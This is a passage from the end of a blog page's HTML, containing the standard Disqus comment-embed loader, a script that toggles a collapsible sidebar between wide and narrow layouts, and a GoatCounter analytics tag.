            /* * * DON'T EDIT BELOW THIS LINE * * */
    (function () {
        var dsq = document.createElement('script');
        dsq.type = 'text/javascript';
        dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
            this.style.display = 'none';        
        };
</script>
<!-- /disqus -->
    <script>
        const wrapper = document.getElementById('wrapper');
        const sidebarBig = document.getElementById('sidebar-wrapper');
        const sidebarSmall = document.getElementById('sidebar-wrapper-small');

        const triggers = Array.from(document.querySelectorAll('[data-toggle="collapse"]'));
        for (var i = 0; i < triggers.length; i++) { 
            triggers[i].addEventListener('click', (ev) => {
                const elm = ev.currentTarget;    
                ev.preventDefault();
                const selector = elm.getAttribute('href').replace('#','');
                elm.classList.toggle('collapsed');
                document.getElementById(selector).classList.toggle('show');
            }, false);
        } 

        function showBigNav() {;
            sidebarBig.style.display = 'block';
            sidebarSmall.style.display = 'none';
        }
        function showSmallNav() {
            sidebarBig.style.display = 'none';
            sidebarSmall.style.display = 'block';
        }

        const mediaQuery = window.matchMedia('(min-width:768px)');
        mediaQuery.onchange = e => {
            if (wrapper.classList.contains('toggled')) {
                    wrapper.classList.remove('toggled');
            } else {
                if (e.matches) {
                    showBigNav();
                } else {
                    showSmallNav();
                }
            }
        }

        function setNavbar() {
            var condition = wrapper.classList.contains('toggled');
            if (!mediaQuery.matches) {
                condition = !condition;
            }
            if (condition) {
                showSmallNav();
            } else {
                showBigNav();
            }
        }

        function toggleMenu(){
            wrapper.classList.toggle('toggled');
            setNavbar();
        }

        window.onload = setNavbar;
    </script>
	<script data-goatcounter="https://f3real.goatcounter.com/count"
        async src="//gc.zgo.at/count.js"></script>
</body>
</html>